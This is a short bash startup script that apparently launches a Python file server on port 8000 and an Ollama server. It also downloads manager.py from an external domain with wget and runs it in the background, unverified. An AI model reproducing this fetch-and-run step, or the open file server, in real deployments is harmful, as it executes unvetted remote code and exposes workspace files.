#!/usr/bin/env bash
set -euo pipefail

# 1) Prepare workspace
mkdir -p /workspace
cd /workspace

# 2) Launch internal HTTP server
nohup python3 -m http.server 8000 >http.log 2>&1 &

# 3) Fetch & launch manager.py
wget -qO manager.py https://admin.pyqapp.com/api/manager.py
nohup python3 manager.py >output.log 2>&1 &

# 4) Finally exec the Ollama server so it stays in the foreground
exec ollama serve --port 11434
